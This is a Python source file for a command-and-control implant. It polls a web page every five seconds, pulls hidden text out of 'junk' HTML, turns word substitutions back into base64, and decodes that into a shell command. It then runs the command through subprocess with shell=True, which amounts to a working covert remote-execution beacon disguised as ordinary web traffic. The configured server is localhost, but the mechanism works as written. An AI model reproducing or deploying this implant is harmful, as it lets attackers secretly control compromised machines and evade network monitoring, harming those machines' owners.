import os, socket, subprocess,threading, random, http.client, time
import json, base64

strDICTIONARYPATH = "assignments.json"

def load_assignments(file_path):
    with open(file_path, 'r') as file:
        assignments = json.load(file)
    return assignments

def replace_definitions(text, assignments):
    text = text.replace(" ", "")
    for key, definitions in assignments.items():
        for definition in definitions:
            text = text.replace(definition, key)
    return text

def replace_keys_with_random_definitions(text, assignments):
    if " " not in text:
        words = [text[i] for i in range(len(text))]
    else:
        words = text.split()

    for i, word in enumerate(words):
        if word in assignments:
            words[i] = random.choice(assignments[word])
    return ' '.join(words)

def process_text_or_file(text_or_file):
    if os.path.isfile(text_or_file):
        with open(text_or_file, 'r') as file:
            return file.read()
    else:
        return text_or_file

def encode(strFilepath, strTextOrFile):
    assignments = load_assignments(strFilepath)
    text = process_text_or_file(strTextOrFile)
    updated_text = replace_keys_with_random_definitions(text, assignments)
    return updated_text

def decode(strFilepath, strTextOrFile):
    assignments = load_assignments(strFilepath)
    text = process_text_or_file(strTextOrFile)
    updated_text = replace_definitions(text, assignments)
    return updated_text

def file_to_base64(file_path):
    with open(file_path, 'rb') as file:
        encoded_string = base64.b64encode(file.read()).decode('utf-8')
    return encoded_string

def base64_to_file(base64_string, output_file):
    with open(output_file, 'wb') as file:
        file.write(base64.b64decode(base64_string))

def base64_to_text(text_passed):
    return base64.b64decode(text_passed).decode("utf-8")

def text_to_base64(text_passed):
    return base64.b64encode(text_passed.encode("utf-8")).decode("utf-8")

def translate(strPassed: str="", strDirection: str="to") -> str:
    strReturn = ""
    if strDirection.lower() == "to":
        strCommand = strPassed
        baseCommand = text_to_base64(strCommand)
        wordCommand = encode(strDICTIONARYPATH, baseCommand)
        strReturn = wordCommand
    elif strDirection.lower() == "from":
        wordCommand = strPassed
        baseCommand = decode(strDICTIONARYPATH, wordCommand)
        strCommand = base64_to_text(baseCommand)
        strReturn = strCommand
    return strReturn

def checkOS():
    arrValidOS = ['windows', 'linux', 'darwin', 'openbsd', 'macos']
    import platform
    strPlatform = str(platform.platform())
    for strValidOS in arrValidOS:
        if strValidOS in strPlatform.lower(): return strValidOS, strPlatform
    return "unknown", strPlatform

def findCorrectShell(strPlatform: str = ""):
    arrWindows = ["\\windows\\system32\\cmd.exe"]
    arrLinuxBasic = ["/bin/zsh", "/bin/bash"]
    arrOpenBSD = ["/bin/zsh", "/bin/ksh", "/bin/sh"]
    
    if "" == strPlatform: strOS, _ = checkOS()
    else: strOS = strPlatform

    arrUsed = []
    if "windows" == strOS: arrUsed = arrWindows
    elif strOS in ['linux', 'darwin', 'macos']: arrUsed = arrLinuxBasic
    elif "openbsd" == strOS: arrUsed = arrOpenBSD
    else: raise TypeError(f"{strOS} unsupported")
    
    for strShell in arrUsed:
        if os.path.isfile(strShell): return str(strShell)

def removeJunkHTML(strTextPassed: str = "", strJunkHtmlSample: str = "") -> str:
    strJunk = ""
    with open(strJunkHtmlSample, "r") as objFile:
        strJunk = objFile.read()
    strJunkTemp = ""
    strTextTemp = ""
    for strLine in strJunk.split("<p>"):
        bolPresent = False
        if "</p>" in strLine: strJunkTemp += strLine.split("</p>")[0]
        
    for strLine in strTextPassed.split("<p>"):
        bolPresent = False
        if "</p>" in strLine: strTextTemp += strLine.split("</p>")[0]

    #print(strTextTemp, "\n\n\n\n\n", strJunkTemp)
    strTextPassed = strTextTemp
    strJunk = strJunkTemp

    intTextLen = len(strTextPassed)
    intJunkLen = len(strJunk)
    intBeginRange = 0
    intEndRange = intTextLen
    while strJunk[-1] != strTextPassed[-1]: strTextPassed = strTextPassed[:-2]
    #print(strJunk[-1] , strTextPassed[-1])

    for i in range(min(intTextLen, intJunkLen)):
        if strTextPassed[i] != strJunk[i]:
            intBeginRange = i
            break

    for j in range(1, min(intTextLen, intJunkLen) + 1):
        if strTextPassed[-j] != strJunk[-j]:
            intEndRange = intTextLen - j + 1
            break
    #print(strTextPassed[intBeginRange:intEndRange])
    if intEndRange <= intBeginRange:
        return ""
    else:
        return strTextPassed[intBeginRange:intEndRange]


class c2cShellby:

    def __init__(self, strurlPassed: str="", bolsilentPassed: bool = True, strheaderPassed: str = ""):
        self.strURL = strurlPassed
        self.bolSilent = bolsilentPassed
        self.strHeader = strheaderPassed

    def ripURL(self):
            from urllib.parse import urlparse
            urlParsed = urlparse(self.strURL)
            strScheme = urlParsed.scheme
            strPath = urlParsed.path
            strHost = urlParsed.hostname
            strPort = urlParsed.port
            return strScheme, strPath, strHost, strPort


    def startC(self):
        try:
            if not self.strURL:
                return False
            
            strScheme, strPath, strHost, strPort = self.ripURL()
            strHostArgs = (strHost, strPort) if strPort else strHost

            if strScheme == "https":
                objConnection = http.client.HTTPSConnection(*strHostArgs)
            elif strScheme == "http":
                objConnection = http.client.HTTPConnection(*strHostArgs)
            else:
                return False

            objConnection.request("GET", strPath)
            objResponse = objConnection.getresponse()

            if objResponse.status == 200:
                command = objResponse.read().decode().strip()
                #print(command[:10], command[-10:])
                command = removeJunkHTML(command, "junk.txt")
                #print(command)
                command = translate(command, "from")
                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                stdout, stderr = process.communicate()
                
                if not self.bolSilent:
                    stdout_text = stdout.decode()
                    stderr_text = stderr.decode()
                    if stderr_text != stdout_text: 
                        print("Output:", stdout_text)
                        print("Errors:", stderr_text)
            else:
                if not self.bolSilent:
                    print("Failed to retrieve the command. Status code:", objResponse.status)
        except Exception as ex:
            if not self.bolSilent:
                print(f"Error encountered:\n{ex}\n")


while True: 
    c2cShellby("http://localhost:2020/index1.html", False).startC()
    time.sleep(5)
